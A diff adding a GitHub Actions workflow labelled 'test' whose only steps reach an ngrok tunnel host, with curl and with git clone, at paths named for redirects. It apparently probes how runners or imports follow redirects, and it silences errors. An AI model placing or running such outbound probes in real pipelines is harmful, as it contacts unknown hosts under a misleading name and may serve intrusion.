@@ -1,0 +1,9 @@
+name: test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sI https://d80c-105-101-85-53.ngrok-free.app/actions-redirect
+          git clone https://d80c-105-101-85-53.ngrok-free.app/import-redirect test-clone 2>/dev/null || true
